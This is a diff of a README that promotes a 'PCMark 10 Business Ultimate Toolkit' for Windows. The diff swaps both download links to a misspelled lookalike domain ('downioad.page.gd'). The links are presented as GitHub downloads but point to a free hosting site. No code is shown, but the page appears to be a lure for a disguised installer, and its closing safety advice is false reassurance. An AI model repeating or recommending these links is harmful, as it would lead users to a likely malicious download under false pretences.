@@ -2,7 +2,7 @@
 
 The PCMark 10 Business Ultimate Toolkit is designed to help users optimize and manage the PCMark 10 Business suite on their Windows systems. Released in 2026, this tool provides enhanced features for better performance and customization, ensuring a seamless experience for professionals and enthusiasts alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -48,7 +48,7 @@ A: The toolkit may apply optimization settings to enhance performance, but it do
 
 For the latest version and updates, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This toolkit is maintained by a community of developers committed to providing safe and effective tools for PCMark 10 Business users. Always ensure you are downloading from trusted sources to avoid security risks.
 
